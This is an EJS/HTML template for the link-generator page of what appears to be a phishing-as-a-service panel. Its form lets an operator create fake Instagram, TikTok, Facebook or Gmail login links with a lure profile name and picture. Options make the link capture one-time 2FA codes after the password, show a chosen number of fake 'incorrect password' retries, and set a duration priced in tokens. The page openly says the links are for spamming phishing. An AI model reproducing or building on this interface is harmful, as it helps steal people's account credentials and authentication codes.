<link
  rel="stylesheet"
  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
  integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
  crossorigin="anonymous"
  referrerpolicy="no-referrer"
/>
<style>
  form button {
    margin-top: 10px;
    color: #fff;
    font-weight: 500;
    display: flex;
    align-items: center;
    justify-content: center;
    border: none;
    border-radius: 5px;
  }

  #submit2 img {
    width: 1.3em;
    animation-name: roll;
    animation-duration: 0.7s;
    animation-iteration-count: infinite;
    animation-timing-function: linear;
    color: white;
  }

  @keyframes roll {
    from {
      transform: rotate(0deg);
    }
    to {
      transform: rotate(360deg);
    }
  }
</style>

<div class="main-panel">
  <div class="content-wrapper">
    <h1>Generate A New Link</h1>

    <form
      action="/create-link2"
      method="post"
      class="form mt-4"
      style="max-width: 500px"
      onsubmit="handleSubmit()"
    >
      <%-include("./partials/messages")%>
      <div class="mb-3">
        <label for="">Link Name</label>
        <input
          type="text"
          placeholder="Link name"
          name="name"
          class="form-control text-white"
          required
        />
        <small class="text-white"
          >Give this link a short name, example: Instagram with OTP</small
        >
      </div>
      <div class="mb-3">
        <label for="">Profile Picture URL</label>
        <p>
          Visit:
          <a href="https://postimages.org/" target="_blank">this website</a>,
          upload the image and paste the <strong>direct link</strong>. The
          second link is the direct link!
        </p>
        <br />
        <input
          type="text"
          placeholder="paste direct link here"
          name="picture"
          class="form-control text-white"
          required
        />
      </div>
      <div class="mb-3">
        <label>Contestant's Full Name</label>
        <input
          type="text"
          placeholder="Model Name e.g  Emily Johnson"
          class="form-control text-white"
          name="modelName"
          required
        />
        <small class="text-white"
          >Name of the social media account you will be using to spam phisphing
          links</small
        >
      </div>
      <div class="mb-3">
        <label>Choose Social Media</label>
        <select
          class="form-select form-control text-white"
          aria-label="Default select example"
          name="linkType"
          required
        >
          <option value="INSTAGRAM" class="text-white">INSTAGRAM</option>
          <option value="TIKTOK" class="text-white">TIKTOK</option>
          <option value="FACEBOOK" class="text-white">FACEBOOK</option>
          <option value="GMAIL" class="text-white">GMAIL</option>
        </select>
        <small class="text-white"
          >We are working on adding more social media links
        </small>
      </div>
      <div class="mb-3">
        <label>Two Factor Authentication</label>
        <select
          class="form-select form-control text-white"
          aria-label="Require OTP"
          required
          name="otpEnabled"
        >
          <option value="false" class="text-white">No</option>
          <option value="true" class="text-white">Yes</option>
        </select>
        <small class="text-white"
          >Yes for the link to collect OTP after collecting logs
        </small>
      </div>
      <div class="mb-3">
        <label>USA Link</label>
        <select
          class="form-select form-control text-white"
          aria-label="Require OTP"
          required
          name="usLink"
        >
          <option value="true" class="text-white">Yes</option>
          <option value="false" class="text-white">No</option>
        </select>
        <small class="text-white"
          >Are you using it in USA region?
        </small>
      </div>
      <div class="mb-3">
        <label>Number of Password Retries</label>
        <select
          class="form-select form-control text-white"
          aria-label="Require OTP"
          required
          name="numberOfRetries"
        >
          <option value="1" class="text-white">0</option>
          <option value="2" class="text-white">1</option>
          <option value="3" class="text-white">2</option>
          <option value="4" class="text-white">3</option>
        </select>
        <small class="text-white"
          >How many times you want it to show incorrect password
        </small>
      </div>
      <div class="mb-3">
        <label>Duration</label>
        <select
          class="form-select form-control text-white"
          required
          name="duration"
          id="duration"
        >
          <option value="1" class="text-white">1 Week</option>
          <option value="2" class="text-white">2 Weeks</option>
          <option value="3" class="text-white">3 Weeks</option>
          <option value="4" class="text-white">1 Month</option>
          <option value="8" class="text-white">2 Months</option>
          <option value="12" class="text-white">3 Months</option>
        </select>
      </div>
      <div class="mb-3">
        <label for="">Price(in tokens)</label>
        <input
          type="text"
          placeholder="1 token"
          name="price"
          class="form-control text-white bg-dark"
          required
          readonly
          id="price"
          value="1 token(s)"
        />
      </div>
      <div class="ml-1 row">
        <button
          type="submit"
          name="submit"
          class="LogInBTN btn btn-success mr-4"
          id="submit"
          style="width: 100%"
        >
          Generate Link
          <i class="fas fa-cog"></i>
        </button>
        <button
          type="button"
          class="LogInBTN btn btn-success mr-4"
          id="submit2"
          style="display: none; width: 100%"
        >
          <img src="/img/loading.svg" alt="" />
        </button>
        <!-- <a href="/pricing">
          <button
            type="button"
            class="LogInBTN btn btn-primary"
            style="width: 100%"
          >
            Buy tokens
            <i class="fas fa-dollar"></i>
          </button>
        </a> -->
      </div>
    </form>
  </div>
</div>

<script>
  const submitBtn = document.getElementById("submit");
  const submitBtn2 = document.getElementById("submit2");
  const duration = document.getElementById("duration");
  const price = document.getElementById("price");

  const handleSubmit = (e) => {
    submitBtn.style.display = "none";
    submitBtn2.style.display = "block";
  };

  duration.addEventListener("change", (e) => {
    price.value = duration.value + " token(s)";
  });
</script>
